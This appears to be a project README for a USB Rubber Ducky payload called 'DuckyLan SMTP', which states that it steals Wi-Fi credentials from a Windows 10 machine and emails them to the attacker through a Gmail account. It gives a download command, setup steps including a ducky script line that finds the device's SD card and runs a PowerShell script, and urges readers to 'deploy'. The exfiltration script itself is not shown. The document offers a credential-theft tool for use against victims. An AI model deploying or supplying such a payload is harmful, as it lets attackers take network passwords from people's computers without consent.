# DuckyLan SMTP 
> Blue Cosmo

---

```
________                 __           .____                   
\______ \  __ __   ____ |  | _____.__.|    |   _____    ____  
 |    |  \|  |  \_/ ___\|  |/ <   |  ||    |   \__  \  /    \ 
 |    `   \  |  /\  \___|    < \___  ||    |___ / __ \|   |  \
/_______  /____/  \___  >__|_ \/ ____||_______ (____  /___|  /
        \/            \/     \/\/             \/    \/     \/
```

## Overview:
A USB RubberDucky payload that steals Wi-Fi credentials and sends them to the attacker via STMP.

## Resources:
- [YouTube Video]()
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
- [Twin-Duck firmware](https://www.youtube.com/watch?v=BzYH-BPHLpE)
- Gmail account
    - i suggest making a separate Gmail account for this payload
    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled
- Windows 10 Target

## Download:
```bash
svn checkout https://github.com/CosmodiumCS/payloads/trunk/rubberducky/DucKey-Logger
```

## Instructions:
Set-Up/Installation
1. change Gmail credentials in *p.ps1*
```powershell
# gmail credentials
$email = "example@gmail.com"
$password = "password"
```
2. in line 15 of *payload.txt*, change 'W' to the name of your ducky [SD Card]
```powershell
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'W'}|select name;cd $u.name;./p.ps1;exit
```
3. flash Twin-Duck firmware on to your duck
    - [Tutorial](https://www.youtube.com/watch?v=BzYH-BPHLpE)
4. load, encode, and deploy!!

---

- hope you enjoy the payload!!
- please subscribe to my [YouTube channel](https://youtube.com/cosmodiumcs) :)

#projects #malware 